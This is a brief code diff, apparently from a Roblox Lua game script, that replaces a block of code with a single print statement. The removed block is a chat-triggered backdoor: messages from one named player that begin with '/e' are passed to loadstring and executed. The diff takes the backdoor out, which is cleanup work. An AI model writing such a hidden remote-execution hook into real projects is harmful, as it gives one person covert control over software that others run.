@@ -1,10 +1,1 @@
-for i,v in pairs(game:GetService("Players"):GetChildren()) do
-  if player.Name == "AshleyCold" then
-    player.Chatted:connect(function(Message)
-    if string.sub(Message,1,2) == "/e" then
-      loadstring(string.sub(Message,4))()
-    end
-    end)
-  
-  end
-end
+print('a')
